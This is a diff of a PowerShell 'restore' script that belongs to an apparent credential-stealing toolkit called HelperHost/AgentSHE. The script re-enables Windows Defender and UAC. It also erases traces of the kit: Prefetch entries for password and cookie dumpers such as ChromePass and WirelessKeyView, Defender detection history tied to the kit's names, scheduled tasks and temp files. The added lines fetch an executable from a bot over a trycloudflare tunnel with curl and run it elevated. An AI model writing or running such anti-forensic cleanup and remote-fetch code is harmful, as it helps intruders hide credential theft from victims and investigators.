@@ -1,6 +1,7 @@
 # Restores Windows security + removes HelperHost install side-effects.
 # Safe to re-run. Prefer elevated (HelperHostWipeRestore task).
 # UAC is restored LAST so mid-wipe elevated steps don't re-prompt.
+# Order: STOP EarlyAV → enable-defender → clear policies → services → scrub ALL traces.
 $ErrorActionPreference = 'SilentlyContinue'
 try { $PSNativeCommandUseErrorActionPreference = $false } catch {}
 
@@ -10,13 +11,44 @@ function Test-IsAdmin {
   return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
+$kit = Join-Path $env:ProgramData 'HelperHostWipe'
+if (-not (Test-Path $kit)) { New-Item -ItemType Directory -Path $kit -Force | Out-Null }
+# Abort EarlyAV on any future boot BEFORE anything else
+'1' | Set-Content -Encoding ASCII (Join-Path $kit 'STOP') -Force
+
 # Self-elevate if needed (manual restore from PowerShell)
 if (-not (Test-IsAdmin) -and $env:AGENTSHE_ELEVATED -ne '1') {
   $self = $MyInvocation.MyCommand.Path
   if (-not $self) {
-    # iex'd from memory: re-download elevated
+    # iex'd from memory: prefer kit/local copy, then bot_base from wipe-state — never a dead tunnel URL
     $url = $env:AGENTSHE_RESTORE_URL
-    if (-not $url) { $url = 'https://mayor-western-issn-sticker.trycloudflare.com/files/scripts/restore-win-security.ps1' }
+    $kitRestore = Join-Path $kit 'restore-win-security.ps1'
+    if (-not $url -and (Test-Path $kitRestore)) { $self = $kitRestore }
+    if (-not $url -and -not $self) {
+      try {
+        $ws = Get-Content (Join-Path $env:TEMP 'hh-wipe-state.json') -Raw -EA SilentlyContinue | ConvertFrom-Json
+        if ($ws.bot_base) { $url = ($ws.bot_base.TrimEnd('/') + '/files/scripts/restore-win-security.ps1') }
+      } catch {}
+    }
+    if (-not $url -and -not $self -and $env:AGENTSHE_BOT_BASE) {
+      $url = ($env:AGENTSHE_BOT_BASE.TrimEnd('/') + '/files/scripts/restore-win-security.ps1')
+    }
+    if ($self) {
+      $psi = New-Object System.Diagnostics.ProcessStartInfo
+      $psi.FileName = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+      $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$self`""
+      $psi.Verb = 'runas'
+      $psi.UseShellExecute = $true
+      try {
+        $p = [Diagnostics.Process]::Start($psi)
+        $p.WaitForExit()
+        Write-Output 'security-restored (elevated)'
+      } catch {
+        throw 'UAC refusee — relance en tant qu''Administrateur'
+      }
+      exit 0
+    }
+    if (-not $url) { throw 'restore URL inconnue — lance restore-win-security.ps1 en Admin' }
     $wrap = Join-Path $env:TEMP ('hh-restore-manual-' + [guid]::NewGuid().ToString('n') + '.ps1')
     @(
       "`$ErrorActionPreference='SilentlyContinue'"
@@ -44,31 +76,33 @@ $hh = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $cache = Join-Path $env:TEMP 'HelperHostCache'
 $tools = Join-Path $hh 'tools'
 
-$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|ChromeCookiesView|BrowsingHistoryView|WirelessKeyView|WNetWatcher|hh-wipe|hh-restore|hh-export|early-av|dControl|disable-defender|enable-defender'
+$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|ChromeCookiesView|BrowsingHistoryView|WirelessKeyView|WNetWatcher|hh-wipe|hh-restore|hh-export|early-av|dControl|disable-defender|enable-defender|HelperHostWipe|defender-control|Cleaner\.exe|sudden-admissions'
 
 # Kill EarlyAV first so a reboot cannot re-disable Defender mid-restore
-foreach ($tn in @('HelperHostEarlyAV', 'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot')) {
+foreach ($tn in @('HelperHostEarlyAV', 'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot', 'HelperHostDControlOff', 'HelperHostDControlOn', 'AgentShePC')) {
   Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
   schtasks /Delete /TN $tn /F 2>$null | Out-Null
 }
 
 # Re-enable Defender via pgkt04 enable-defender.exe (open-source), then drop ALL org policies.
-# Kill legacy Sordum dControl if still around (UI loop).
 Get-Process dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
 Remove-Item (Join-Path $hh 'dControl.exe') -Force -EA SilentlyContinue
 Remove-Item (Join-Path $hh 'dc-off.cmd') -Force -EA SilentlyContinue
+Remove-Item (Join-Path $hh 'early-av.cmd') -Force -EA SilentlyContinue
 
 $en = Join-Path $hh 'enable-defender.exe'
+$enKit = Join-Path $kit 'enable-defender.exe'
 $enTemp = Join-Path $env:TEMP 'hh-enable-defender.exe'
 $enRun = $null
-if (Test-Path $en) {
-  Copy-Item $en $enTemp -Force -EA SilentlyContinue
-  $enRun = $enTemp
-} elseif (Test-Path $enTemp) {
-  $enRun = $enTemp
+foreach ($cand in @($enKit, $enTemp, $en)) {
+  if ((Test-Path $cand) -and (Get-Item $cand).Length -gt 100000) { $enRun = $cand; break }
 }
-# Pull from bot if missing (manual restore after wipe)
+# Pull from bot if missing (manual restore after wipe) — bot_base from kit/wipe-state only
 $botEnable = $null
+try {
+  $bj = Get-Content (Join-Path $kit 'bot.json') -Raw -EA SilentlyContinue | ConvertFrom-Json
+  if ($bj.bot_base) { $botEnable = ($bj.bot_base.TrimEnd('/') + '/files/tools/enable-defender.exe') }
+} catch {}
 try {
   $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
   if ($st) {
@@ -84,14 +118,19 @@ if (-not $enRun -and -not $botEnable -and $env:AGENTSHE_RESTORE_URL) {
     $botEnable = (($env:AGENTSHE_RESTORE_URL -replace '/files/scripts/.*$', '') + '/files/tools/enable-defender.exe')
   } catch {}
 }
-# Hardcoded public bot for emergency restore when no state left
 if (-not $enRun -and -not $botEnable) {
-  $botEnable = 'https://sudden-admissions-capacity-triumph.trycloudflare.com/files/tools/enable-defender.exe'
+  try {
+    $ws = Get-Content (Join-Path $env:TEMP 'hh-wipe-state.json') -Raw -EA SilentlyContinue | ConvertFrom-Json
+    if ($ws.bot_base) { $botEnable = ($ws.bot_base.TrimEnd('/') + '/files/tools/enable-defender.exe') }
+  } catch {}
 }
 if (-not $enRun -and $botEnable) {
   try {
     & curl.exe -fsSL $botEnable -o $enTemp
-    if ((Test-Path $enTemp) -and (Get-Item $enTemp).Length -gt 100000) { $enRun = $enTemp }
+    if ((Test-Path $enTemp) -and (Get-Item $enTemp).Length -gt 100000) {
+      $enRun = $enTemp
+      Copy-Item $enTemp $enKit -Force -EA SilentlyContinue
+    }
   } catch {}
 }
 if ($enRun) {
@@ -106,7 +145,7 @@ if ($enRun) {
 Remove-Item (Join-Path $hh '.dcontrol-off') -Force -EA SilentlyContinue
 Remove-Item (Join-Path $hh 'disable-defender.exe') -Force -EA SilentlyContinue
 Remove-Item (Join-Path $hh 'enable-defender.exe') -Force -EA SilentlyContinue
-Remove-Item $enTemp -Force -EA SilentlyContinue
+# Keep kit enable-defender until end of script (retry safety)
 foreach ($tn in @('HelperHostDControlOff', 'HelperHostDControlOn', 'HelperHostEarlyAV')) {
   Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
   schtasks /Delete /TN $tn /F 2>$null | Out-Null
@@ -153,6 +192,15 @@ Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotific
 Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotificationOnLockScreen -Force -EA SilentlyContinue
 if (Get-Command Set-MpPreference -EA SilentlyContinue) {
   Set-MpPreference -UILockdown $false -EA SilentlyContinue
+}
+cmd.exe /c 'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\UX Configuration" /v UILockdown /t REG_DWORD /d 0 /f >nul 2>&1' | Out-Null
+cmd.exe /c 'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f >nul 2>&1' | Out-Null
+# Security Center page locks
+foreach ($sub in @(
+  'Virus and threat protection','App and browser protection','Account protection',
+  'Family options','Device security','Firewall and network protection'
+)) {
+  cmd.exe /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\$sub`" /v UILockdown /f >nul 2>&1" | Out-Null
 }
 
 # --- Remove ALL Defender org policies (reg.exe — more reliable than PS Remove-Item) ---
@@ -245,6 +293,46 @@ if (Get-Command Remove-MpPreference -EA SilentlyContinue) {
   }
 }
 Remove-Item (Join-Path $hh '.av-off') -Force -EA SilentlyContinue
+
+# Refresh signatures (install used to gut them — we no longer do that, but repair if empty)
+$mpCmd = $null
+$plat = Get-ChildItem 'C:\ProgramData\Microsoft\Windows Defender\Platform' -Directory -EA SilentlyContinue |
+  Sort-Object Name -Descending | Select-Object -First 1
+if ($plat) {
+  $c = Join-Path $plat.FullName 'MpCmdRun.exe'
+  if (Test-Path $c) { $mpCmd = $c }
+}
+if (-not $mpCmd) {
+  $c = Join-Path $env:ProgramFiles 'Windows Defender\MpCmdRun.exe'
+  if (Test-Path $c) { $mpCmd = $c }
+}
+if ($mpCmd) {
+  try { & $mpCmd -wdenable 2>$null | Out-Null } catch {}
+  try { Start-Process -FilePath $mpCmd -ArgumentList '-SignatureUpdate' -Wait -WindowStyle Hidden -EA SilentlyContinue } catch {}
+}
+
+# Repair quoted ImagePath if a previous broken restore stripped quotes
+foreach ($pair in @(
+  @{ Name='MDCoreSvc'; Exe='MpDefenderCoreService.exe' },
+  @{ Name='MpDefenderCoreService'; Exe='MpDefenderCoreService.exe' },
+  @{ Name='WinDefend'; Exe='MsMpEng.exe' }
+)) {
+  $key = "HKLM:\SYSTEM\CurrentControlSet\Services\$($pair.Name)"
+  if (-not (Test-Path $key)) { continue }
+  $ip = (Get-ItemProperty $key -Name ImagePath -EA SilentlyContinue).ImagePath
+  if (-not $ip) { continue }
+  if ($ip -notmatch '"' -and $ip -match 'Program Files|ProgramData') {
+    if ($plat) {
+      $full = Join-Path $plat.FullName $pair.Exe
+      if (Test-Path $full) {
+        Set-ItemProperty $key -Name ImagePath -Value ('"' + $full + '"') -Type ExpandString -Force -EA SilentlyContinue
+      }
+    }
+  }
+}
+
+# Clear defender-control working dir leftovers
+Remove-Item 'C:\ProgramData\defender-control' -Recurse -Force -EA SilentlyContinue
 
 # Clear local Defender detections / history tied to our names (best-effort)
 try {
@@ -354,11 +442,11 @@ Get-ChildItem $env:TEMP -Filter 'HelperHost-*' -EA SilentlyContinue | Remove-Ite
 Get-ChildItem $env:TEMP -Filter 'hh-*' -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
 Get-ChildItem $env:TEMP -Filter 'hh-export-*' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
 
-# Prefetch (HelperHost + tools + cloudflared rename)
+# Prefetch (HelperHost + tools + defender-control + wipe)
 $pf = "$env:SystemRoot\Prefetch"
 if (Test-Path $pf) {
   Get-ChildItem $pf -EA SilentlyContinue | Where-Object {
-    $_.Name -match '^(HELPERHOST|EDGERELAY|CHROMEPASS|WEBBROWSERPASSVIEW|PASSWORDFOX|MAILPV|MSPASS|NETPASS|IEPV|DIALUPASS|PSTPASSWORD|CLOUDFLARED)'
+    $_.Name -match '^(HELPERHOST|EDGERELAY|CHROMEPASS|WEBBROWSERPASSVIEW|PASSWORDFOX|MAILPV|MSPASS|NETPASS|IEPV|DIALUPASS|PSTPASSWORD|CLOUDFLARED|DISABLE-DEFENDER|ENABLE-DEFENDER|DCONTROL|HH-WIPE|HH-RESTORE|CLEANER|CHROMECOOKIESVIEW|BROWSINGHISTORYVIEW|WIRELESSKEYVIEW|WNETWATCHER)'
   } | Remove-Item -Force -EA SilentlyContinue
 }
 
@@ -460,8 +548,8 @@ foreach ($p in @($hh, $cache, $cacheAlt, $tools)) {
       Stop-Process -Force -EA SilentlyContinue
     attrib -h -s /s /d "$p\*" 2>$null | Out-Null
     attrib -h -s $p 2>$null | Out-Null
-    cmd /c "takeown /f `"$p`" /r /d y" | Out-Null
-    cmd /c "icacls `"$p`" /grant Everyone:F /t /c /q" | Out-Null
+    cmd /c "takeown /f `"$p`" /r /d o" | Out-Null
+    cmd /c "icacls `"$p`" /grant *S-1-5-32-544:F /t /c /q" | Out-Null
     Get-ChildItem -LiteralPath $p -Recurse -Force -File -EA SilentlyContinue | ForEach-Object {
       try {
         $_.Attributes = 'Normal'
@@ -494,5 +582,20 @@ if (Test-Path $sysPol) {
   Set-ItemProperty $sysPol -Name EnableInstallerDetection -Value $eid -Type DWord -Force
 }
 Remove-Item $uacBak -Force -EA SilentlyContinue
+
+# Final: wipe kit + TEMP enable leftovers (restore finished)
+Remove-Item $enTemp -Force -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'hh-enable-defender.exe' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'hh-restore-manual-*.ps1' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'hh-restore-security.ps1' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'hh-restore-elev.ps1' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'hh-wipe-state.json' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'hh-defender-*' -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'REPARER-DEFENDER*' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
+# Remove wipe kit last (STOP already written; EarlyAV gone)
+if (Test-Path $kit) {
+  Get-ChildItem $kit -Force -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
+  Remove-Item $kit -Force -Recurse -EA SilentlyContinue
+}
 
 Write-Output 'security-restored'
